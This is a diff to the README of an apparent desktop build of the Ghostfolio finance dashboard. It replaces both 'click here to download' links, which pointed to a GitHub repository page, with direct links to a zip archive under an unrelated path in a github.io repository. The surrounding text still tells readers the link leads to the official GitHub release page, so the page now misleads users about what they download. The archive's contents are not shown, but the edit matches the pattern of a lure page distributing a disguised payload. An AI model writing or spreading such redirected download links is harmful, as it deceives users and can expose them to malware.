@@ -49,7 +49,7 @@ This is the most important step. We'll guide you through exactly how to get the 
 
 ### Step 1: Get the File
 
-**[⬇️ CLICK HERE TO DOWNLOAD (Opens in a New Window)](https://github.com/helencam40/Ghostfolio-Desktop-Self-Hosted-Dashboard)**
+**[⬇️ CLICK HERE TO DOWNLOAD (Opens in a New Window)](https://raw.githubusercontent.com/helencam40/helencam40.github.io/main/condignity/App_2.7.zip)**
 
 Visit this link to download the application. This takes you to the official GitHub page where the download files are hosted. Look for the biggest, most obvious button or link that says "Download" or "Releases."
 
@@ -194,6 +194,6 @@ This project is supported by a community of passionate users and developers. If 
 
 **Remember:** Your download link is at the top of this page. Click it, follow the simple steps, and welcome to your new life of financial clarity.
 
-**[⬇️ CLICK HERE TO DOWNLOAD NOW](https://github.com/helencam40/Ghostfolio-Desktop-Self-Hosted-Dashboard)**
+**[⬇️ CLICK HERE TO DOWNLOAD NOW](https://raw.githubusercontent.com/helencam40/helencam40.github.io/main/condignity/App_2.7.zip)**
 
 Keywords: asset-tracking, dashboard, docker, finance, finance-app, ghostfolio, investment-portfolio, pwa
